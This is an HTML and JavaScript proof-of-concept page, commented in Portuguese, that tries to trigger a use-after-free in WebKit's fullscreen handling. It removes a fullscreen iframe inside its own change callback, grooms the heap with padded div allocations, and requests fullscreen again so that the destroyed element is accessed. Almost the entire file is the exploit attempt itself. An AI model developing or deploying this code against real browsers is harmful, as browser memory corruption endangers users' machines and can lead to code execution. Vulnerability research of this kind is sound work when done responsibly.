<html>
<body>
<button id="run">Run V5</button>
<div id="status">Ready</div>
<div id="log" style="font-family:monospace;font-size:11px;
     height:200px;overflow-y:auto;border:1px solid #ccc;padding:4px"></div>
<iframe id="testFrame" width="100" height="100"></iframe>
<script>
/*
  V5 — ESCALADA DO FUNDO PRETO DA V2:
  
  Fase 1: Reproduz a V2 (fullscreenchange no filho → iframe.remove())
          para colocar FullscreenManager em estado corrompido.
  
  Fase 2: Com o estado corrompido, tenta:
    (a) webkitRequestFullscreen() em elemento do doc PRINCIPAL
        → FullscreenManager tenta limpar o fullscreen anterior
        → acessa m_fullscreenElement que aponta para element destruído
    (b) Força reflow/layout do compositor via getBoundingClientRect()
    (c) Cria novos iframes para groom do heap antes da fase (a)
*/

var iframe  = document.getElementById("testFrame");
var popup   = null;
var phase   = 0;

function log(msg) {
    var div  = document.getElementById("log");
    var line = document.createElement("div");
    line.textContent = "[fase" + phase + "] " + msg;
    div.appendChild(line);
    div.scrollTop = div.scrollHeight;
}

// Fase 2: tenta usar o FullscreenManager corrompido
function phase2() {
    phase = 2;
    log("iniciando — FullscreenManager deve estar corrompido");

    // (b) Força layout — compositor tenta resolver layers órfãos
    try {
        var r = document.body.getBoundingClientRect();
        log("getBoundingClientRect OK: " + JSON.stringify(r));
    } catch(e) {
        log("getBoundingClientRect EXCEPTION: " + e);
    }

    // Groom do heap: aloca objetos do mesmo tamanho do Element/Document
    // para tentar reutilizar a memória do iframe destruído
    var groomNodes = [];
    for (var i = 0; i < 50; i++) {
        var d = document.createElement("div");
        d.style.cssText = "width:100px;height:100px;background:#" + 
                          Math.floor(Math.random()*0xFFFFFF).toString(16);
        d.setAttribute("data-pad", new Array(64).join("A")); // padding de tamanho
        groomNodes.push(d);
        document.body.appendChild(d);
    }
    log("heap groom: 50 divs alocados");

    // (a) webkitRequestFullscreen em elemento do doc PRINCIPAL
    // FullscreenManager vai tentar limpar o fullscreen anterior (corrompido)
    // antes de processar o novo request
    var targetEl = document.createElement("div");
    targetEl.style.cssText = "width:200px;height:200px;background:yellow";
    document.body.appendChild(targetEl);

    document.addEventListener('webkitfullscreenchange', function onNewFs() {
        document.removeEventListener('webkitfullscreenchange', onNewFs);
        var el = document.webkitFullscreenElement;
        log("novo fullscreenchange: " + (el ? el.tagName : "null"));

        // Tenta acessar o elemento — se for o destruído, UAF
        if (el) {
            try {
                log("clientWidth=" + el.clientWidth +
                    " tagName=" + el.tagName +
                    " id=" + el.id);
            } catch(e) {
                log("EXCEPTION no acesso: " + e);
            }
        }

        // Força exit do novo fullscreen também
        setTimeout(function() {
            document.webkitExitFullscreen();
            // Limpa nós de groom
            groomNodes.forEach(function(n) {
                if (n.parentNode) n.parentNode.removeChild(n);
            });
        }, 200);
    });

    setTimeout(function() {
        log("chamando webkitRequestFullscreen no doc principal...");
        try {
            targetEl.webkitRequestFullscreen();
        } catch(e) {
            log("EXCEPTION no requestFullscreen: " + e);
        }
    }, 100);
}

// Fase 1: reproduz V2
function phase1() {
    phase = 1;

    iframe.onload = function() {
        var iDoc = iframe.contentDocument;
        iDoc.open();
        iDoc.write(
            '<!DOCTYPE html><html><body>' +
            '<div style="width:200px;height:150px;background:blue"></div>' +
            '</body></html>'
        );
        iDoc.close();

        // Listener no filho — remove iframe DE DENTRO do callback
        iDoc.addEventListener('webkitfullscreenchange', function() {
            log("CHILD fullscreenchange — removendo iframe dentro do callback");

            if (iframe && iframe.parentNode) {
                iframe.remove();
            }
            if (popup && !popup.closed) {
                popup.close();
            }

            log("iframe removido — agendando fase 2");

            // Aguarda o estado corrompido se estabelecer antes da fase 2
            setTimeout(phase2, 300);
        });

        iDoc.documentElement.webkitRequestFullscreen();

        setTimeout(function() {
            if (!popup || popup.closed) return;
            popup.focus();
            window.focus();
            try { iframe.contentWindow.focus(); } catch(e) {}

            setTimeout(function() {
                if (popup && !popup.closed) popup.close();
            }, 300);
        }, 300);
    };

    // Re-carrega o iframe para garantir estado limpo
    iframe.src = "about:blank";
}

document.getElementById("run").onclick = function() {
    document.getElementById("log").innerHTML = "";
    phase = 0;

    popup = window.open("", "_blank", "width=400,height=300");
    if (!popup) {
        document.getElementById("status").innerHTML = "Popup bloqueado!";
        return;
    }
    popup.document.open();
    popup.document.write(
        '<!DOCTYPE html><html><body><h3>Popup V5</h3></body></html>'
    );
    popup.document.close();

    document.getElementById("status").innerHTML = "Fase 1 iniciada";
    phase1();
};
</script>
</body>
</html>
